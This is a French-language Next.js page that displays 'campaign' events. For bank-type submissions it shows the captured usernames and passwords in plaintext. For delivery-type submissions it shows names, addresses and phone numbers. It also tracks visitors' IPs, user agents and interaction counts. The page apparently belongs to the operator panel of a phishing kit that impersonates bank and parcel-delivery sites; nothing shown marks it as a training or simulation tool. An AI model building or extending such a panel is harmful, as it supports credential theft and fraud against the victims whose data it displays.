// pages/event/[id].jsx
import { useRouter } from 'next/router';
import useSWR from 'swr';
import Link from 'next/link';
import { Bar } from 'react-chartjs-2';
import {
  Chart as ChartJS,
  CategoryScale,
  LinearScale,
  BarElement,
  Title,
  Tooltip,
  Legend
} from 'chart.js';
import { useEffect, useState } from 'react';

ChartJS.register(CategoryScale, LinearScale, BarElement, Title, Tooltip, Legend);

const fetcher = (url) => {
  const token = localStorage.getItem('token');
  return fetch(url, {
    headers: { 'Authorization': `Bearer ${token}` },
  }).then((res) => {
    if (!res.ok) throw new Error('Failed to fetch event');
    return res.json();
  });
};

export default function EventDetails() {
  const router = useRouter();
  const { id } = router.query;
  const [userId, setUserId] = useState(null);

  useEffect(() => {
    setUserId(localStorage.getItem('user_id'));
  }, []);

  // Use the unified endpoint.
  const { data: event, error } = useSWR(
    id && userId ? `/api/events/${id}?user_id=${userId}` : null,
    fetcher
  );

  if (error)
    return (
      <div className="text-center mt-10">
        Erreur lors du chargement de l&apos;événement.
      </div>
    );
  if (!event)
    return (
      <div className="text-center mt-10">
        Chargement des détails de l&apos;événement...
      </div>
    );

  // Determine if the event came from campaigns based on a unique field (e.g., campaign_id).
  const isCampaignEvent = event.hasOwnProperty('campaign_id');

  // (Optional) Prepare a bar chart if the event is a form submission.
  let aggregatedChart = null;
  if (event.event_type === 'formSubmit' && event.additional_data) {
    const clickCount = Number(event.additional_data.totalClicks || 0);
    const inputCount = Number(event.additional_data.totalInputs || 0);
    const barChartData = {
      labels: ['Clics', 'Saisies'],
      datasets: [
        {
          label: 'Interactions utilisateurs',
          data: [clickCount, inputCount],
          backgroundColor: ['#36A2EB', '#FFCE56']
        }
      ]
    };

    aggregatedChart = (
      <div className="mt-6">
        <h3 className="text-2xl font-bold mb-2">
          Interactions agrégées {isCampaignEvent ? '(Campagne)' : '(Utilisateur)'}
        </h3>
        <div className="bg-white p-4 rounded shadow" style={{ height: '300px' }}>
          <Bar data={barChartData} options={{ responsive: true, maintainAspectRatio: false }} />
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50 p-4">
      <div className="container mx-auto max-w-4xl">
        <Link href="/dashboard">
          <p className="text-blue-500 hover:underline mb-4 inline-block">
            ← Retour au tableau de bord
          </p>
        </Link>

        <div className="bg-white p-6 rounded shadow">
          {isCampaignEvent ? (
            <>
              <h1 className="text-3xl font-bold mb-4">
                Détails de l&apos;événement de Campagne (ID : {event.id})
              </h1>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                {/* Always visible fields */}
                <div>
                  <strong>Type de soumission :</strong> {event.submission_type}
                </div>
                <div>
                  <strong>Agent utilisateur :</strong> {event.user_agent}
                </div>
                <div className="md:col-span-2">
                  <strong>Date de création :</strong> {event.created_at}
                </div>
                {/* Additional fields based on submission_type */}
                {event.submission_type === 'bank' ? (
                  <>
                    <div>
                      <strong>Nom d&apos;utilisateur :</strong> {event.username}
                    </div>
                    <div>
                      <strong>Mot de passe :</strong> {event.password}
                    </div>
                  </>
                ) : event.submission_type === 'delivery' ? (
                  <>
                    <div>
                      <strong>Nom :</strong> {event.name}
                    </div>
                    <div>
                      <strong>Adresse :</strong> {event.adress}
                    </div>
                    <div>
                      <strong>Téléphone :</strong> {event.phone}
                    </div>
                  </>
                ) : null}
              </div>
            </>
          ) : (
            <>
              <h1 className="text-3xl font-bold mb-4">
                Détails de l&apos;événement Utilisateur (ID : {event.id})
              </h1>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                  <strong>ID utilisateur :</strong> {event.user_id}
                </div>
                <div>
                  <strong>Type d&apos;événement :</strong> {event.event_type}
                </div>
                <div>
                  <strong>Horodatage :</strong> {event.timestamp}
                </div>
                <div>
                  <strong>Adresse IP :</strong> {event.ip_address}
                </div>
                <div className="md:col-span-2">
                  <strong>Agent utilisateur :</strong> {event.user_agent}
                </div>
              </div>
              {event.additional_data && (
                <>
                  <h2 className="text-2xl font-bold mt-6 mb-2">
                    Données supplémentaires de l&apos;événement Utilisateur
                  </h2>
                  <div className="border p-4 rounded">
                    {event.additional_data.action && (
                      <div>
                        <strong>Action :</strong> {event.additional_data.action}
                      </div>
                    )}
                    {event.additional_data.details && (
                      <div>
                        <strong>Détails :</strong> {event.additional_data.details}
                      </div>
                    )}
                  </div>
                </>
              )}
            </>
          )}
          {aggregatedChart}
        </div>
      </div>
    </div>
  );
}
